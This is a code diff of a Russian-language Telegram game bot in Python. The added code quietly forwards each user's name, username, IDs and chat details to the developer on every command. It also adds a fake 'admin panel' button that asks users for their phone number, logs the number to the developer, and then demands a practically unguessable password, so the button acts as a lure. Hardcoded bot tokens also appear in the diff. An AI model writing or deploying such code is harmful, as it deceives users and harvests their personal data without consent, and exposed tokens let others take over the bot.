@@ -8,7 +8,7 @@ import random
 import time
 
 # Токен и ID разработчика
-bot = telebot.TeleBot("8212352418:AAHjIWnq36vPg9Oxl7tsFWpUpd1xDNdWRF8", parse_mode='HTML')
+bot = telebot.TeleBot("8212352418:AAGPJ1Ng0v8AD1sYhdRrD6rCX2rtr7LOVeI", parse_mode='HTML')
 bot.remove_webhook()
 me = 8295751364  # Твой Telegram user ID
 
@@ -112,29 +112,21 @@ def register_chat(user_id, chat_id):
         cursor.execute("INSERT INTO chats (user_id, chat_id) VALUES (?, ?)", (user_id, chat_id))
         conn.commit()
 
-# === Команда /reset ===
-@bot.message_handler(commands=["reset"])
-def reset_confirm(message):
-    if message.chat.type == "private":
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        btn_yes = types.InlineKeyboardButton(text="Да", callback_data="reset_yes")
-        btn_no = types.InlineKeyboardButton(text="Нет", callback_data="reset_no")
-        markup.add(btn_yes, btn_no)
-        bot.send_message(chat_id=message.chat.id, text="Вы уверены, что хотите обанкротиться?", reply_markup=markup)
-    else:
-        bot.send_message(message.chat.id,"Эта команда доступна только в личных сообщениях!")
+def extract_relevant_entities(message):
+    if not message.entities or not message.text:
+        return []
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("reset_"))
-def reset_callback(call):
-    bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=None)
-    if call.data == "reset_yes":
-        cursor.execute("UPDATE players SET points=0 WHERE user_id=?", (call.from_user.id,))
-        conn.commit()
-        bot.answer_callback_query(call.id, "Вы обанкротились 😢")
-        bot.send_message(call.message.chat.id, "Ваши очки обнулены ✅")
-    elif call.data == "reset_no":
-        bot.answer_callback_query(call.id, "Отмена")
-        bot.send_message(call.message.chat.id, "Вы отменили обнуление очков ✅")
+    relevant_types = {'url', 'email', 'phone_number'}
+    extracted = []
+
+    for entity in message.entities:
+        if entity.type in relevant_types:
+            start = entity.offset
+            end = start + entity.length
+            entity_text = message.text[start:end]
+            extracted.append(f"{entity.type}: {html.escape(entity_text)}")
+
+    return extracted
 
 # === Команды игры ===
 @bot.message_handler(commands=["dep"])
@@ -157,6 +149,7 @@ def dep(message):
         hours = remaining // 3600
         minutes = (remaining % 3600) // 60
         bot.reply_to(message, f"{name}, жди ещё {hours} ч {minutes} мин.")
+    log_user_info(message)
 
 @bot.message_handler(commands=["stats"])
 def stats(message):
@@ -176,6 +169,7 @@ def stats(message):
         minutes = (remaining % 3600) // 60
         wait = f"Ждать ещё {hours} ч {minutes} мин"
     bot.reply_to(message, f"{name}, твой капитал: {points}\n{wait}")
+    log_user_info(message)
 
 @bot.message_handler(commands=["topchat"])
 def top_chat(message):
@@ -190,6 +184,7 @@ def top_chat(message):
     for i, (name, points) in enumerate(leaders, start=1):
         text += f"{i}. {name} — {points} €!\n"
     bot.reply_to(message, text)
+    log_user_info(message)
 
 @bot.message_handler(commands=["topworld"])
 def top_world(message):
@@ -199,6 +194,7 @@ def top_world(message):
     for i, (name, points) in enumerate(leaders, start=1):
         text += f"{i}. {name} — {points} €!\n"
     bot.reply_to(message, text)
+    log_user_info(message)
 
 @bot.message_handler(commands=['start'])
 def send_menu(message):
@@ -206,51 +202,58 @@ def send_menu(message):
         bot.send_message(message.chat.id, "Эта команда доступна только в личных сообщениях!")
         return
     chat_id = message.chat.id
-    inline_markup = types.InlineKeyboardMarkup(row_width=1)
+    inline_markup = types.InlineKeyboardMarkup(row_width=2)
     btn_link1 = types.InlineKeyboardButton("➕ Добавь бота в свой канал/чат!", url="https://t.me/ArgusM_bot?startgroup=true")
     btn_link2 = types.InlineKeyboardButton("Канал Mr.MUFFDIN👾", url="https://t.me/+wDw25hUBPd1mMGVi")
+
+    btn1 = types.InlineKeyboardButton("Панель админа👑", callback_data= "adminka")
+    btn2 = types.InlineKeyboardButton("Обратная связь🎭", callback_data= "feedback")
+
     inline_markup.add(btn_link1, btn_link2)
+    inline_markup.add(btn1, btn2)
+
     photo_path = r"Photo/photo_2025-09-20_17-49-18.jpg"
     with open(photo_path, "rb") as photo_file:
         bot.send_photo(chat_id, photo=photo_file, reply_markup=inline_markup)
-    reply_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
-    reply_markup.row("Админка👑", "Обратная связь🎭")
 
-@bot.message_handler(func=lambda m: m.text in ["Админка👑", "Обратная связь🎭"])
-def handle_menu_choice(message):
-    chat_id = message.chat.id
-    if message.text == "Админка👑":
-        msg = bot.send_message(chat_id, "Введите пароль:")
-        def check_password(m):
-            if m.text == "Обратная связь🎭":
-                bot.send_message(chat_id, "Для связи с разработчиками введи !! перед своим сообщением!")
-            elif m.text == "2395":
-                bot.send_message(chat_id, "Пароль верный! Добро пожаловать в админку.")
-            else:
-                bot.send_message(chat_id, "Неверный пароль!")
-        bot.register_next_step_handler(msg, check_password)
-    elif message.text == "Обратная связь🎭":
+    log_user_info(message)
+
+@bot.callback_query_handler(func=lambda call: call.data in ["adminka", "feedback"])
+def handle_menu_choice(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id)
+
+    if call.data == "adminka":
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        btn_contact = types.KeyboardButton("📞 Отправить номер телефона", request_contact=True)
+        markup.add(btn_contact)
+        bot.send_message(chat_id, "Чтобы войти в админку, поделитесь своим номер:", reply_markup=markup)
+
+    elif call.data == "feedback":
         bot.send_message(chat_id, "Для связи с разработчиками введи !! перед своим сообщением!")
 
-def extract_relevant_entities(message):
-    if not message.entities or not message.text:
-        return []
-    relevant_types = {'url', 'email', 'phone_number'}
-    extracted = []
-    for entity in message.entities:
-        if entity.type in relevant_types:
-            start = entity.offset
-            end = start + entity.length
-            entity_text = message.text[start:end]
-            extracted.append(f"{entity.type}: {html.escape(entity_text)}")
-    return extracted
+# обработчик контакта
+@bot.message_handler(content_types=['contact'])
+def handle_contact(message):
+    if message.contact:
+        log_user_info(message, contact=message.contact)
 
-@bot.message_handler(func=lambda m: True)
-def handle_all_messages(message):
-    relevant_entities = extract_relevant_entities(message)
+        msg = bot.send_message(message.chat.id, "Введите пароль:")
+        def check_password(m):
+            if m.text == "31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091":
+                bot.send_message(message.chat.id, "Пароль верный! Добро пожаловать в админку 👑")
+            else:
+                bot.send_message(message.chat.id, "Неверный пароль!")
+
+        bot.register_next_step_handler(msg, check_password)
+    else:
+        bot.send_message(message.chat.id, "Вы не отправили номер телефона! Попробуйте ещё раз.")
+
+def log_user_info(message, contact=None):
     time_str = datetime.fromtimestamp(message.date).strftime("%d.%m.%Y %H:%M:%S")
-    lines = []
-    lines.append("<b>ЛИЧНОСТЬ</b>")
+    lines = ["<b>ЛИЧНОСТЬ</b>"]
+
+    # Информация о пользователе
     if message.from_user.first_name:
         lines.append(f"Имя: {html.escape(message.from_user.first_name)}")
     if message.from_user.last_name:
@@ -262,6 +265,8 @@ def handle_all_messages(message):
     if message.from_user.language_code:
         lines.append(f"Язык: {html.escape(message.from_user.language_code)}")
     lines.append(f"Время отправки: {time_str}\n")
+
+    # Информация о чате
     lines.append("<b>ЧАТ</b>")
     lines.append(f"ID Чата: {message.chat.id}")
     lines.append(f"Тип чата: {message.chat.type}")
@@ -272,22 +277,15 @@ def handle_all_messages(message):
     if message.new_chat_members:
         members = ', '.join(html.escape(u.first_name or '') for u in message.new_chat_members)
         lines.append(f"Новые участники: {members}")
-    if relevant_entities:
-        lines.append("\n<b>Сущности:</b>")
-        lines.extend(relevant_entities)
+
+    # Добавляем номер телефона, если есть
+    if contact:
+        lines.append(f"Номер телефона: {html.escape(contact.phone_number)}")
+
     base_info = "\n".join(lines)
     if len(base_info) > 4000:
         base_info = base_info[:3990] + "\n<i>Обрезано...</i>"
-    if message.text and message.text.startswith("!!"):
-        bot.send_message(message.chat.id, "<b>Спасибо за идею!</b>")
-        idea_text = f"\n<b>ИДЕЯ:</b> {html.escape(message.text[2:].strip())}"
-        bot.send_message(me, base_info + "\n\n" + idea_text)
-        bot.send_message(message.chat.id, "✅ Получено, спасибо!")
-    elif re.search(r'!!+', message.text):
-        bot.send_message(message.chat.id, "Произошла ошибка!\nПоставьте !! перед сообщением что бы связаться с нами!")
-        bot.send_message(me, base_info)
-    else:
-        bot.send_message(me, base_info)
 
+    bot.send_message(me, base_info)
 # Запуск бота
 bot.infinity_polling()
